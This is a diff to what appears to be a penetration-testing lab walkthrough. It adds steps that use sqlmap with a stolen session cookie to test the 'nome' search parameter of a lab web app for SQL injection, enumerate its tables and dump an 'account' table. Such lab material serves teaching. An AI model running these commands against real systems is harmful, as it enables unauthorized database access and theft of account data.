@@ -28,12 +28,24 @@ It's an open source penetration testing tool that automates the process of detec
 
 If you are using the attacking machine that was provided to you, sqlmap is already installed. Otherwise, you can download it here: https://github.com/sqlmapproject/sqlmap
 
-It is good to check if the "nome" parameter is vulnerable, to do this you need to use the following command:
+To check if the "name" parameter is vulnerable it is necessary to set the session (previously stolen) to allow sqlmap to see the /search page, to do this you need to use the following command:
 
 **sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION"**
 * **-u**: Target Url
 * **-p**: Testable parameter(s)
 * **--cookie**: HTTP cookie header value
+
+After that we can proceed to inspect the databases:
+
+**sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION" --tables**
+* **--tables**: Enumaret DBMS database tables
+
+It turns out that there is a database called "networkSecurity" with a table called "account". The last step is to see the contents of this table:
+
+**sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION" -D networkSecurity -T account --dump**
+* **-D**: DBMS database to enumerate
+* **-T**: DBMS database table(s) to enumerate
+* **--dump**: Dump DBMS database table entries
 
 ## Command Injection
 
